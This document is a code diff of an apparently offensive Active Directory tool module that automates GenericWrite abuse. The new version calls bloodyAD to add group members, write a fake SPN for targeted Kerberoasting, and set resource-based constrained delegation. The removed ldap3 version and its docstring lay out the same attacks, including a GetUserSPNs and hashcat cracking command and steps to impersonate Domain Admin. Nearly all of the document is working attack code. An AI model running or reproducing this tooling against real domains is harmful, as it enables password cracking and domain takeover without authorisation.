@@ -1,168 +1,121 @@
 # strategies/generic_write.py
 
-from ldap3 import Server, Connection, NTLM, ALL, MODIFY_ADD
-from ldap3.core.exceptions import LDAPException
-
+from dataclasses import dataclass
 from .exploit_strategy import ExploitStrategy
 from entities.edge import Edge
 from entities.node import Node
 from entities.node_kind import NodeKind
 from entities.exploit_result import ExploitResult
+from entities.edge_kind import EdgeKind
 from exceptions.hop_failed_error import HopFailedError
+from services.printing import print_check, print_warning, print_done
+from utils.runner import run_tool
+from utils.platform import BACKEND
 
+
+@dataclass
 class GenericWriteStrategy(ExploitStrategy):
-	"""
-	GenericWrite : AD ACL (Access Control Entry) 
-	to write access to non-protected attributes of an OBJECT
+    edge:   Edge
+    victim: Node
 
-==============================================================================
-	CASE 01 — On a User (Kerberoasting Injection)
-==============================================================================
-		Only service accounts have SPNS
-		With this, you can write fake SPN
-		Then, KDC issues a TGS encrypted with their NTLM
-		Attacker has GenericWrite on VICTIM_USER
-		→ Set victim.servicePrincipalName = "fake/spn"
-		→ Request TGS: GetUserSPNs.py or Rubeus
-		→ Crack the hash offline: hashcat
-		→ Cleartext password recovered
-		SPN format : serviceClass/hostname
+    @property
+    def attacker(self) -> Node:
+        return self.edge.source_node
 
-==============================================================================
-	CASE 02 — On a Group (AddMember)
-==============================================================================
-		Usually equivalent to AddMember
+    @property
+    def target(self) -> Node:
+        return self.edge.goal_node
 
-==============================================================================
-	CASE 3 — On a Computer --> RBCD (Resource-Based Contrained Delegation)
-==============================================================================
-	A Computer object has the attribute : msDS-AllowedToActOnBehalfOfOtherIdentity
-	1. Create a fake computer account (MachineAccountQuota allows this by default)
-	2. Write that fake computer's SID into msDS-AllowedToActOnBehalfOfOtherIdentity of the target machine
-	3. Use S4U2Self + S4U2Proxy to impersonate any user (including Domain Admin) to the target machine
-	4. Get a Service Ticket as Administrator → PSExec/WinRM in
+    def can_exploit(self) -> bool:
+        return self.edge.kind in {EdgeKind.GENERIC_WRITE, EdgeKind.GENERIC_ALL}
 
-==============================================================================
-	TOOLS : impacket-addcomputer, impacket-rbcd, geST.py
-==============================================================================
-	impacket
-		impacket.ldap — LDAP operations (write the attribute)
-		impacket.ldap.ldaptypes — RBCD
-		impacket.examples.utils — parsing
-	ldap3 — alt for attribute writes
+    def exploit(self, creds: dict) -> ExploitResult:
+        if BACKEND.name == "none":
+            raise HopFailedError(
+                self.edge,
+                "No backend available. Run: pip install bloodyAD  "
+                "(or on Windows: wsl pip install bloodyAD)"
+            )
 
-==============================================================================
-	STRATEGY CLASS
-==============================================================================
-	Input:  Edge(source_node, goal_node, kind=GenericWrite)
-		goal_node can be: User | Computer | Group
-	Decision logic:
-		if goal_node.kind == USER    → SPN injection → Kerberoast
-		if goal_node.kind == COMPUTER → RBCD attack
-		if goal_node.kind == GROUP    → AddMember (treat as MemberOf pivot)
-	Output: exploitation steps, commands, or raised HopFailedError
+        print_check(
+            f"GenericWrite [{BACKEND.name}]: "
+            f"{self.attacker.label} ──▶ {self.target.label}"
+        )
 
-	"""
+        match self.target.kind:
+            case NodeKind.GROUP:
+                return self._add_member(creds)
+            case NodeKind.USER:
+                return self._targeted_kerberoast(creds)
+            case NodeKind.COMPUTER:
+                return self._rbcd(creds)
+            case _:
+                raise HopFailedError(
+                    self.edge,
+                    f"GenericWrite on {self.target.kind.value} — no known technique"
+                )
 
-	def can_exploit(self, edge: Edge) -> bool:
-		return edge.kind == "GenericWrite"
+    # ── Techniques ────────────────────────────────────────────────────────────
 
-	def exploit(self, edge: Edge, attacker: Node, creds: dict) -> ExploitResult:
-		target = edge.goal_node
-		if target.kind == NodeKind.USER:
-			return self._exploit_user(edge)
-		elif target.kind == NodeKind.GROUP:
-			return self._exploit_group(edge, attacker, creds)
-		elif target.kind == NodeKind.COMPUTER:
-			return self.exploit_computer(edge, attacker, creds)
-		else:
-			raise HopFailedError(
-				edge,
-				f"GenericWrite on {target.kind.value} — no known technique"
-			      )
+    def _add_member(self, creds: dict) -> ExploitResult:
+        group_sam  = _sam(self.target.label)
+        victim_sam = _sam(self.victim.label)
 
-	def _exploit_user(self, edge: Edge, attacker: Node, creds: dict) -> ExploitResult:
-		# STEP 01 — What does the function need to know?
-		"""
-		SPN needs
-			dc_ip
-			WHO auth     : domain, username, password
-			WHICH target : DN in LDAP
-			WHAT SPN     : fake SPN
-		in creds or edge.goal_node.properties
-		"""
-		target     = edge.goal_node
-		target_dn  = target.properties.get("distinguishedname")
-		target_sam = target.properties.get("samaccountname")
-		domain     = target.properties.get("domain","").lower()
+        ok, output = run_tool(_bloodyad(creds, [
+            "add", "groupMember", group_sam, victim_sam
+        ]))
 
-		# STEP 02 — VALIDATE
-		if not target_dn:
-			raise HopFailedError(edge, "target has no distinguishedname in properties")
-		if not target_sam:
-			raise HopFailedError(edge, "target has no samaccountname in properties")
+        if not ok:
+            raise HopFailedError(self.edge, f"AddMember failed:\n{output}")
 
-		# STEP 03 — Build the fake SPN string
-		fake_spn = f"fake/pwned.{domain}"
+        print_done(f"{victim_sam} added to {group_sam}")
+        return ExploitResult(success=True, output=output, technique="AddMember")
 
-		# STEP 04 — Open LDAP Connection
-		"""
-		Talk to DC
-			Server     : WHERE connect (IP, port)
-			Connection : TCP session + authentication
-			bin()      : automatically with auto_bind=True
-		"""
-		dc_ip    = creds["dc_ip"]
-		username = creds["username"]
-		password = creds["password"]
-		domain   = creds["domain"] # NetBIOS name : "SEVENKINGDOMS"
+    def _targeted_kerberoast(self, creds: dict) -> ExploitResult:
+        target_sam = _sam(self.target.label)
 
-		try:
-			server   = Server(dc_ip, port=389, get_info=ALL)
-			conn     = Connection(
-				server,
-				user=f"{domain}\\{username}", # DOMAIN\user for NTLM
-				password=password,
-				authentication=NTLM,
-				auto_bind=True
-			   )
+        ok, output = run_tool(_bloodyad(creds, [
+            "set", "object", target_sam,
+            "--attribute", "servicePrincipalNames",
+            "--value",     f"fake/roast.{creds['domain']}"
+        ]))
 
-			success  = conn.modify(target_dn, {"servicePrincipalName": [(MODIFY_ADD, [fake_spn])]})
-			# != MODIFY_REPLACE not to overwrite existing values
-			if not success: # insufficientAccessRights, constraintViolation
-				raise HopFailedError(edge, f"LDAP modify rejected: {conn.result['description']}")
+        if not ok:
+            raise HopFailedError(self.edge, f"SPN write failed:\n{output}")
 
-		except LDAPException as e:
-			raise HopFailedError(edge, f"LDAP error: {e}")
+        print_done(f"SPN set on {target_sam} — ready to Kerberoast")
+        return ExploitResult(success=True, output=output, technique="TargetedKerberoast")
 
-		# STEP 05 — Return the result
-		return ExploitResult(
-			technique = "GenericWrite → SPN Injection → Kerberoasting",
-			edge      = edge,
-			success   = True,
-			next_command = (
-				f"GetUserSPNs.py {domain}/{username}:'{password}' "
-				f"-dc-ip {dc_ip} "
-				f"-request-user {target_sam} "
-				f"-outputfile {target_sam}.hash\n"
-				f"hashcat -m 13100 {target_sam}.hash "
-				f"/usr/share/wordlists/rockyou.txt"
-			),
-			cleanup_command = (
-				f"bloodyAD -u {username} -p '{password}' "
-				f"-d {domain} --dc-ip {dc_ip} "
-				f"set object {target_sam} servicePrincipalName -v ''"
-			),
-			notes = (
-				f"SPN '{fake_spn}' written to {target.label}. "
-				f"Run next_command to request and crack the TGS hash."
-			)
-		)
+    def _rbcd(self, creds: dict) -> ExploitResult:
+        target_sam   = _sam(self.target.label)
+        attacker_sam = _sam(self.attacker.label)
 
-#	def _spn_injection(self, edge: Edge) -> dict:
+        ok, output = run_tool(_bloodyad(creds, [
+            "add", "rbcd", target_sam, attacker_sam
+        ]))
 
-	def _add_member(self, edge: Edge) -> dict:
-		raise HopFailedError(edge, "_exploit_computer not yet implemented")
+        if not ok:
+            raise HopFailedError(self.edge, f"RBCD write failed:\n{output}")
 
-	def _rbcd(self, edge: Edge) -> dict:
-		raise HopFailedError(edge, "_exploit_computer not yet implemented")
+        print_done(f"RBCD set: {attacker_sam} → {target_sam}")
+        return ExploitResult(success=True, output=output, technique="RBCD")
+
+
+# ── Helpers ───────────────────────────────────────────────────────────────────
+
+def _sam(label: str) -> str:
+    return label.split("@")[0]
+
+
+def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]:
+    cmd = [
+        "bloodyAD",
+        "--host", creds["dc_ip"],
+        "-d",     creds["domain"],
+        "-u",     creds["username"],
+    ]
+    if pw := creds.get("password"):
+        cmd += ["-p", pw]
+    elif nh := creds.get("hashes"):
+        cmd += ["--hashes", nh]
+    return cmd + subcommand
